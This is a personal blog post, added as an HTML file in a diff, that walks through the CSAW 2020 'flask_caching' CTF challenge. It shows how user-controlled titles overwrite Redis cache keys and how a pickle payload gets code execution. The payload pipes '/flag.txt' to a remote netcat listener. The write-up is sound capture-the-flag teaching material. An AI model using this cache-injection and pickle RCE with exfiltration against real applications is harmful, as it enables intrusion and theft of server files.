@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>CSAW 2020 flask_caching - Scott Linder</title>
+    <link rel="stylesheet" href="/normalize.css">
+    <link rel="stylesheet" href="/main.css">
+    </head>
+<body>
+        
+        <div id="header">
+            <div class="c"><ul id="breadcrumb"><li><a href="/">~</a></li><li><a href="https://www.scottlinder.com/post/">Posts</a></li></ul><ul id="navbar">
+    
+    <li><a href="https://www.scottlinder.com/post/">Posts</a></li>
+    
+    <li><a href="https://www.scottlinder.com/talk/">Talks</a></li>
+    
+    <li><a href="https://www.scottlinder.com/code/">Code</a></li>
+    
+</ul>
+</div>
+        </div>
+        
+        <div id="content" class="c">
+<h1>CSAW 2020 flask_caching</h1>
+<p>The 300 point web problem in the 2020 CSAW CTF seems to have a reasonable
+number of solves, and I don&rsquo;t have much time in the evening, so I think I&rsquo;ll
+start there.</p>
+<h2 id="whats-in-a-name">What&rsquo;s in a name?</h2>
+<p>The problem comes with a single source file for a flask-based webapp, <code>app.py</code>,
+and a link to a live instance.</p>
+<p>Scanning the source, the following line stands out:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">redis<span style="color:#f92672">.</span>setex(name<span style="color:#f92672">=</span>title, value<span style="color:#f92672">=</span>content, time<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</code></pre></div><p>This looks like it could represent some sort of injection vulnerability. The
+two things I imagine need to hold for this to be useful are:</p>
+<ul>
+<li>The <code>flask_caching</code> implementation uses predictable keys for cache entries.</li>
+<li>The <code>title</code> here is not being sanitized to prevent it from colliding with
+those predictable keys.</li>
+</ul>
+<p>So I start into verifying the former by pulling down source for
+<code>flask_caching</code> (or rather diving into the existing virtualenv I had made), but
+a reality check from a teammate, Flay, saves me some time: just running the
+app locally, and using <code>redis-cli KEYS '*'</code> after requesting a cached view,
+spits out a deterministic result:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ curl -s http://0.0.0.0:5000/test0 &gt;/dev/null <span style="color:#f92672">&amp;&amp;</span> redis-cli KEYS <span style="color:#e6db74">&#39;*&#39;</span>
+1<span style="color:#f92672">)</span> <span style="color:#e6db74">&#34;flask_cache_view//test0&#34;</span>
+</code></pre></div><p>By inspection we can also all but confirm the latter: the <code>title</code> is only
+required to be present in the request, and have a length of no more than <code>100</code>
+codepoints (or bytes, not sure what kind of string it is, and it ends up being
+immaterial anyway).</p>
+<p>Let&rsquo;s try this all out with an example:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ curl -s http://0.0.0.0:5000/test0 &gt;/dev/null <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    <span style="color:#f92672">&amp;&amp;</span> redis-cli GET flask_cache_view//test0 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    <span style="color:#f92672">&amp;&amp;</span> printf <span style="color:#e6db74">&#39;foobar&#39;</span> | curl -s http://0.0.0.0:5000/ -X POST <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>        -F title<span style="color:#f92672">=</span>flask_cache_view//test0 -F content<span style="color:#f92672">=</span>@- <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    <span style="color:#f92672">&amp;&amp;</span> redis-cli GET flask_cache_view//test0
+<span style="color:#e6db74">&#34;!\x80\x04\x95\b\x00\x00\x00\x00\x00\x00\x00\x8c\x04test\x94.&#34;</span>
+Thanks!
+<span style="color:#e6db74">&#34;foobar&#34;</span>
+</code></pre></div><p>Great!</p>
+<h2 id="weaponizing-a-pickle">Weaponizing a Pickle</h2>
+<p>My first thought, shared by others on the team, is that the most likely vector
+to exploit this vulnerability is at the point where a live cache entry is
+deserialized, and most likely the serialization being used is Pickle. This may
+just be wishful thinking, as Pickle is known to represent RCE on untrusted
+input, but a quick grep of the <code>flask_caching</code> source bears it out. A few lines
+of <code>python</code> later and we have something to test:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> pickle
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> os
+
+<span style="color:#75715e"># this form of de-pickle code execution found by googling &#34;python pickle</span>
+<span style="color:#75715e"># injection&#34; which is a delightful name</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Payload</span>():
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+        <span style="color:#75715e"># the path &#39;/flag.txt&#39; discovered via `ls`, then `ls /`</span>
+        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#39;cat /flag.txt | nc &lt;redacted&gt; 1234&#39;</span>,))
+
+<span style="color:#75715e"># flask_caching prepends &#39;!&#39; to the cache_key when it is a non-integer,</span>
+<span style="color:#75715e"># seemingly as an optimization for integer keys?</span>
+sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;!&#39;</span> <span style="color:#f92672">+</span> pickle<span style="color:#f92672">.</span>dumps(Payload()))
+</code></pre></div><p>With a listen server set up to catch the flag, we can inject the payload into
+the cache and then request the cached view to become the <code>f1@sK_10rD</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nc -l <span style="color:#ae81ff">1234</span> &amp;
+$ ./payload.py <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    | curl -s http://web.chal.csaw.io:5000/ -X POST <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>        -F title<span style="color:#f92672">=</span>flask_cache_view//test0 -F content<span style="color:#f92672">=</span>@- &gt;/dev/null <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    | curl -s http://web.chal.csaw.io:5000/test0 &gt;/dev/null
+flag<span style="color:#f92672">{</span>f1@sK_10rD<span style="color:#f92672">}</span>
+</code></pre></div>
+
+        </div><div id="footer" class="c">
+    <ul>
+        <li>Scott Linder</li>
+        <li>Programmer</li>
+        <li><a href="mailto:scott@scottlinder.com">scott@scottlinder.com</a></li>
+        <li><a href="https://github.com/scott-linder/">github.com/scott-linder</a></li>
+    </ul>
+    <ul>
+        <li>Built: 2020-09-15 at 10:52pm (EDT)</li>
+    </ul>
+</div>
+</body>
+</html>
